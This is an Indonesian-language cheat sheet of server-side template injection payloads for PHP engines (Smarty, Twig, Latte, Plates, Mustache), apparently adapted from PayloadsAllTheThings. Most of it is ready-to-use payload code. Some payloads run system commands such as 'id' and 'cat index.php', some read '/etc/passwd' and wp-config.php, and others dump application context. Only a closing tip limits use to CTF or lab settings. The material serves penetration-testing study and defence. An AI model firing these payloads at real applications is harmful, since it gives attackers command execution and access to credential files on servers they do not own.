# Server Side Template Injection - PHP

> **Server-Side Template Injection (SSTI)** adalah kerentanan di mana penyerang dapat menyisipkan input berbahaya ke dalam template di sisi server, sehingga template engine dapat mengeksekusi perintah arbitrer di server. Pada PHP, SSTI bisa terjadi jika input pengguna dimasukkan ke template engine seperti Smarty, Twig, Latte, dan lain-lain tanpa validasi atau sanitasi yang benar.

## Ringkasan

- [Library Template Populer](#library-template-populer)
- [Payload Dasar](#payload-dasar)
- [Payload Spesifik Engine](#payload-spesifik-engine)
- [Referensi](#referensi)

## Library Template Populer

| Nama Template | Format Payload | Bahasa Pemrograman |
| ------------- | -------------- | ------------------ |
| Smarty        | `{$...}`       | PHP                |
| Twig          | `{{...}}`      | PHP                |
| Latte         | `{...}`        | PHP                |
| Plates        | `<?= ... ?>`   | PHP                |
| Mustache      | `{{...}}`      | PHP                |

## Payload Dasar

Coba payload berikut pada input yang dicurigai:

```smarty
{$7*7}
{{7*7}}
<?= 7*7 ?>
```

Jika output menjadi `49`, kemungkinan aplikasi rentan SSTI.

## Payload Spesifik Engine

### Smarty

- **Injeksi Dasar:**
  ```smarty
  {$7*7}
  ```
- **Eksekusi Perintah (versi lama):**
  ```smarty
  {php}echo `id`;{/php} // Sudah deprecated di Smarty v3
  ```
- **Eksekusi Perintah (versi baru):**
  ```smarty
  {system('id')}
  {system('ls')}
  {system('cat index.php')}
  ```

### Twig

- **Injeksi Dasar:**
  ```twig
  {{7*7}}
  ```
- **Lihat variabel:**
  ```twig
  {{dump(app)}}
  {{dump(_context)}}
  ```
- **Baca file:**
  ```twig
  {{'/etc/passwd'|file_excerpt(1,30)}}
  {{include("wp-config.php")}}
  ```
- **Eksekusi Perintah:**
  ```twig
  {{['id']|filter('system')}}
  {{['cat /etc/passwd']|filter('system')}}
  {{['id']|map('passthru')}}
  ```

### Latte

- **Injeksi Dasar:**
  ```latte
  {var $X="POC"}{$X}
  ```
- **Eksekusi Perintah:**
  ```latte
  {php system('id')}
  ```

### Plates

- **Injeksi Dasar:**
  ```php
  <?= 7*7 ?>
  ```
- **Contoh penggunaan:**
  ```php
  <?php $this->layout('template', ['title' => 'User Profile']) ?>
  <h1>User Profile</h1>
  <p>Hello, <?=$this->e($name)?></p>
  ```

### Mustache

- **Injeksi Dasar:**
  ```mustache
  {{7*7}}
  ```

## Tips

- Selalu cek output aplikasi setelah mengirim payload.
- Gunakan variasi payload jika satu format tidak berhasil.
- Setelah engine teridentifikasi, cari dokumentasi exploitasi engine tersebut.
- Gunakan payload hanya di lingkungan legal (CTF/lab).

## Referensi

- [PayloadAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
